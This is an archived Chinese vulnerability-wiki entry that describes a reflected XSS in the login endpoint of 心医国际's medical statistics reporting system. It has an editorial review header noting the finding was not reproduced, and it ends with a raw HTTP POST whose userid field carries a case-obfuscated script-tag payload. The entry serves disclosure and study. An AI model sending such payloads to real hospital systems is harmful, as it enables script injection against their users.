---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "心医国际医技统计报表系统存在XSS漏洞"
product: "心医国际医技报表XSS"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "SessionCookie与admin密码值不说明真实认证条件；版本修复缺"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E5%BF%83%E5%8C%BB%E5%9B%BD%E9%99%85%E5%8C%BB%E6%8A%80%E7%BB%9F%E8%AE%A1%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/py7flewrq4o85dbe"
id: "vw-87418ba0035fe941e55bfb55"
entity_id: "ve-87418ba0035fe941e55bfb55"
schema_version: "1"
---

# 心医国际医技统计报表系统存在XSS漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：心医国际医技报表XSS
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：SessionCookie与admin密码值不说明真实认证条件；版本修复缺
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 请求含userid脚本但缺响应反射上下文和浏览器执行证据
2. SessionCookie与admin密码值不说明真实认证条件
3. 应标反射型候选而非未知所有XSS
4. 版本修复缺
5. 与同系统SQLi不同根因独立关联
6. 长HTML宣传噪声可清

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/py7flewrq4o85dbe>

### 归档技术正文

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">心医国际是中国专业的医疗云应用解决方案提供商，铺建并运营全国领先的智能医疗云平台，依托十年的数据积累和业务实践，持续创新智能医疗场景应用。业务服务覆盖诊疗、教学、科研、管理等多维度，助力政府、医院及产业合作伙伴，打造线上线下高效协同的智慧医疗健康服务体系，目前已建成覆盖全国31个省，联结2万余家医疗机构的智能医疗云平台，助力建设并服务青海、河南、陕西、山西、贵州、新疆、江西、广西、甘肃9大省级远程医疗平台，服务通达80%全国三甲级医院;成功建设并服务全国300余个省、市、县及专科医联体。心心医国际医技统计报表系统存在XSS漏洞  
</font>**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">心医国际医技统计报表</font><font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">三、漏洞复现</font>**

```plain
POST /EasyReport/login.do?method=handleRequestInternal HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 55
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=E59**************************D01
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

pwd=admin&userid="><ScRiPt>alert(1)</sCrIpT>&userrole=0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/py7flewrq4o85dbe>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
